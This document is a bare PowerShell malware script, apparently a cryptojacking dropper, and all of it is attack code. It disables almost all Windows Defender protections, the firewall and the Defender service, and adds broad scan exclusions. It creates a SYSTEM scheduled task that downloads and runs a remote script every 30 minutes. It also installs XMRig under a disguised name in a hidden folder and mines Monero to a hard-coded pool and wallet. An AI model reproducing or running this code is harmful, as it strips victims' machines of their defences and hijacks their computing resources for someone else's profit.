Set-MpPreference -DisableBehaviorMonitoring $True -DisableArchiveScanning $True -DisableDatagramProcessing $True -DisableDnsOverTcpParsing $True -DisableDnsParsing $True -DisableEmailScanning $True -DisableFtpParsing $True -DisableGradualRelease $True -DisableHttpParsing $True -DisableInboundConnectionFiltering $True -DisableIOAVProtection $True -DisableNetworkProtectionPerfTelemetry $True -DisablePrivacyMode $True -DisableRdpParsing $True -DisableRealtimeMonitoring $True -DisableRemovableDriveScanning $True -DisableRestorePoint $True -DisableScanningMappedNetworkDrivesForFullScan $True -DisableScanningNetworkFiles $True -DisableScriptScanning $True -DisableSshParsing $True -DisableTDTFeature $True -DisableTlsParsing $True -DisableBlockAtFirstSeen $True -DisableIntrusionPreventionSystem $True -LowThreatDefaultAction Allow -ModerateThreatDefaultAction Allow -HighThreatDefaultAction Allow -PUAProtection 0 -ExclusionProcess 'explorer.exe', 'cmd.exe', 'mm.exe', 'powershell.exe', 'svchost.exe', 'scvhost.exe'; netsh advfirewall set all state off; sc stop WinDefend; sc config WinDefend start= disabled; New-Item -ItemType Directory -Force -Path C:\windows\system32\MDSN, C:\ProgramData\MDSN; Add-MpPreference -ExclusionPath 'C:\', 'C:\ProgramData', 'C:\windows\system32\MDSN'; New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force; if (-not (schtasks /query /TN "mmWin" > $null 2>&1)) { schtasks /create /RL HIGHEST /RU "NT AUTHORITY\SYSTEM" /sc minute /mo 30 /tn "mmWin" /tr "cmd.exe /C certutil.exe -urlcache -f https://raw.githubusercontent.com/cyberre124/test/main/atmon.ps1 $env:SystemDrive\Windows\Temp\atmon.ps1 & $env:SystemDrive\Windows\Temp\atmon.ps1" }; if (Test-Path "$env:SystemDrive\Windows\Temp\WinSVC") { if (Test-Path "$env:SystemDrive\Windows\Temp\WinSVC\mm.exe") { Write-Output "Yes" } else { Remove-Item -Recurse -Force "$env:SystemDrive\Windows\Temp\WinSVC"; Remove-Item -Recurse -Force "$env:SystemDrive\Windows\Temp\xmrig-6.21.2" } } else { Write-Output "No"; [Net.ServicePointManager]::SecurityProtocol = 'Tls, Tls11, Tls12, Ssl3'; Invoke-WebRequest -Uri 'https://github.com/xmrig/xmrig/releases/download/v6.21.2/xmrig-6.21.2-msvc-win64.zip' -OutFile "$env:SystemDrive\Windows\Temp\xmrig-6.21.2-msvc-win64.zip"; Expand-Archive -Force "$env:SystemDrive\Windows\Temp\xmrig-6.21.2-msvc-win64.zip" "$env:SystemDrive\Windows\Temp"; Rename-Item "$env:SystemDrive\Windows\Temp\xmrig-6.21.2" "$env:SystemDrive\Windows\Temp\WinSVC"; Rename-Item "$env:SystemDrive\Windows\Temp\WinSVC\xmrig.exe" "$env:SystemDrive\Windows\Temp\WinSVC\mm.exe"; if (Test-Path "$env:SystemDrive\Windows\Temp\WinSVC") { Write-Output "Yes" } else { [System.Reflection.Assembly]::LoadWithPartialName("System.IO.Compression.FileSystem") | Out-Null; $pathToZip = "$env:SystemDrive\Windows\Temp\xmrig-6.21.2-msvc-win64.zip"; $targetDir = "$env:SystemDrive\Windows\Temp"; [System.IO.Compression.ZipFile]::ExtractToDirectory($pathToZip, $targetDir); Rename-Item "$env:SystemDrive\Windows\Temp\xmrig-6.21.2" "$env:SystemDrive\Windows\Temp\WinSVC"; Rename-Item "$env:SystemDrive\Windows\Temp\WinSVC\xmrig.exe" "$env:SystemDrive\Windows\Temp\WinSVC\mm.exe" }; Get-Item "$env:SystemDrive\Windows\Temp\WinSVC" -Force | ForEach-Object { $_.Attributes = $_.Attributes -bor 'Hidden' } }; $host = (hostname); Write-Output $host; $mem = [math]::round((Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).sum / 1GB); Write-Output $mem; $cpu = (Get-CimInstance Win32_ComputerSystem).NumberOfLogicalProcessors; Write-Output $cpu; $name = "$host.$mem`GB.$cpu`CPU"; Write-Output $name; $EXE = "mm.exe"; $process = Get-Process -Name $EXE -ErrorAction SilentlyContinue; if (-not $process) { Write-Output "$EXE is Not Running"; Start-Process -FilePath "$env:SystemDrive\Windows\Temp\WinSVC\mm.exe" -ArgumentList "-o xmrpool.eu:9999 -u 41zgTNW4Z9FiTorttLakhJ8HFN77CXeFw1NNMHa48oqPZZFwrEc6JNj3bDaihgdzmuXDcKZeJhRfBAEAcSeT41hs9cvCMNR -k --tls --rig-id $name --randomx-1gb-pages --background" }
